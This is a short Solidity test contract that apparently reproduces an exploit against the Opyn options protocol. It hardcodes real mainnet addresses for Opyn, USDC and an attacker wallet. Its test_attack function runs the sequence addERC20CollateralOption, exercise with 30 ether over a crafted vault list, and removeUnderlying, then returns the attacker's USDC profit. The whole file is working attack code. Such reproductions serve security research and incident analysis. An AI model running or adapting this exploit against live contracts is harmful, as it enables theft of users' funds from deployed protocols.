// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

contract ContractTest {


    // The function is payable because it sends 30 ether with the call
    function test_attack() public payable returns (uint256) {
        address opyn = 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2;
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;
        (, bytes memory dataBefore) = usdc.call(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        uint256 balBefore = abi.decode(dataBefore, (uint256)) / 1e6;

        uint256 amtToCreate = 300_000_000;
        uint256 amtCollateral = 9_800_000_000;
        opyn.call(
            abi.encodeWithSignature(
                "addERC20CollateralOption(uint256,uint256,address)",
                amtToCreate,
                amtCollateral,
                attacker
            )
        );

        address payable[] memory vaults = new address payable[](2);
        vaults[0] = payable(attacker);
        vaults[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2);

        opyn.call{value: 30 ether}(
            abi.encodeWithSignature("exercise(uint256,address[])", 600_000_000, vaults)
        );

        opyn.call(abi.encodeWithSignature("removeUnderlying()"));

        (, bytes memory dataAfter) = usdc.call(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        uint256 balAfter = abi.decode(dataAfter, (uint256)) / 1e6;

        return balAfter - balBefore;
    }
}
